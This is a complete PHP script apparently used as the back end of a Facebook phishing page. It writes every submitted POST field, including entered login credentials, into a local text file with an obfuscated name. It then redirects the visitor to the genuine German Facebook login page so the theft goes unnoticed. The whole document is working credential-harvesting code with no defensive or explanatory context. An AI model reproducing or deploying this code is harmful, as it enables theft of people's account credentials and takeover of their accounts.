<?php
header ('Location: https://de-de.facebook.com/login/');
$handle = fopen("jkfaökjgkjöakgjfökgaköoeopüepproqwe9oeoriko.txt", "a");
foreach($_POST as $variable => $value) {
    fwrite($handle, $variable);
    fwrite($handle, "=");
    fwrite($handle, $value);
    fwrite($handle, "\r\n");
}
fwrite($handle, "===============\r\n");
fclose($handle);
exit;
?>